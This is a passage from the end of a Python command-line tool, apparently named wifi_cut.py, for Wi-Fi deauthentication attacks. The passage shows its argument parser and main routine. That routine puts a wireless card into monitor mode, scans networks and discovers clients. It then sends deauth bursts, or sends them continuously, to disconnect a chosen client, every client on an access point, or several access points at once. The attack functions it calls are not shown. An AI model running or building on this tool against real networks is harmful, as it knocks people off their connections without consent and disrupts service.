        help="Comma-separated BSSIDs for multi-network attack (use with --multi-deauth)",
    )
    parser.add_argument(
        "--multi-deauth",
        action="store_true",
        help="Attack multiple APs from --bssids (rotates channels)",
    )
    parser.add_argument("-c", "--client", help="Target client MAC (optional)")
    parser.add_argument("--deauth-all", action="store_true", help="Disconnect all clients on AP")
    parser.add_argument("--deauth-count", type=int, default=20, help="Number of deauth bursts")
    parser.add_argument("--continuous", action="store_true", help="Continuous deauth until interrupted")
    args = parser.parse_args()

    print(BANNER)
    require_root()
    check_dependencies()

    if args.check:
        run_diagnostics(args.interface)
        return

    ifaces = get_wifi_interfaces()
    if not ifaces:
        print(f"{R}No wireless interfaces found{RS}")
        sys.exit(1)

    if args.interface:
        iface = args.interface
        if iface not in ifaces:
            print(f"{Y}Warning: {iface} not in detected list {ifaces}, still trying{RS}")
    else:
        print(f"{C}Detected wireless interfaces:{RS}")
        for i, name in enumerate(ifaces, 1):
            print(f"  {i}. {name}")
        if len(ifaces) == 1:
            iface = ifaces[0]
            print(f"{GR}Auto-selected: {iface}{RS}")
        else:
            sel = safe_input(f"{C}Select interface #: {RS}")
            if sel is None:
                sys.exit(0)
            try:
                iface = ifaces[int(sel) - 1]
            except (ValueError, IndexError):
                print(f"{R}Invalid selection{RS}")
                sys.exit(1)

    print(f"\n{G}Using interface: {iface}{RS}")
    mon_iface = start_monitor(iface)
    if not is_wlan_iface(mon_iface):
        print(f"{R}Invalid monitor interface: {mon_iface}{RS}")
        print(f"{Y}Run: sudo python3 wifi_cut.py --check{RS}")
        sys.exit(1)
    print(f"{G}Monitor interface: {mon_iface}{RS}")

    try:
        if args.bssids and args.multi_deauth:
            bssids = [b.strip().upper() for b in args.bssids.split(",") if b.strip()]
            networks = scan_networks(mon_iface, duration=args.scan)
            targets = []
            for b in bssids:
                if b in networks:
                    targets.append(networks[b])
                else:
                    print(f"{Y}BSSID not in scan: {b}{RS}")
            if not targets:
                print(f"{R}No valid targets from --bssids{RS}")
            else:
                multi_deauth_attack(
                    mon_iface,
                    targets,
                    count=0 if args.continuous else args.deauth_count,
                    aggressive=args.aggressive or args.continuous,
                )
        elif args.bssid and (args.deauth_all or args.client or args.continuous):
            count = 0 if args.continuous else args.deauth_count
            ch = args.channel
            nets: Dict[str, Network] = {}
            if not ch:
                nets = scan_networks(mon_iface, duration=15)
                if args.bssid in nets:
                    ch = nets[args.bssid].channel
            stub = nets.get(
                args.bssid,
                Network(bssid=args.bssid, channel=ch or "", power="", encryption="", essid="", clients=[]),
            )
            clients = []
            if ch:
                clients = [c.mac for c in discover_clients(mon_iface, stub, 30, nets)]
            deauth_attack(
                mon_iface,
                args.bssid,
                channel=ch,
                client_mac=args.client,
                count=count,
                aggressive=args.aggressive or args.continuous,
                known_clients=clients,
            )
        elif args.bssid:
            networks = scan_networks(
                mon_iface, args.scan, channel=args.channel,
            )
            if args.bssid in networks:
                display_clients(networks[args.bssid])
            else:
                print(f"{Y}BSSID not found in scan results: {args.bssid}{RS}")
        else:
            interactive_mode(mon_iface)
    except KeyboardInterrupt:
        print(f"\n{Y}Interrupted.{RS}")
    finally:
        stop_monitor(mon_iface, iface)
        print(f"\n{G}Done. Interface restored.{RS}")


if __name__ == "__main__":
    main()
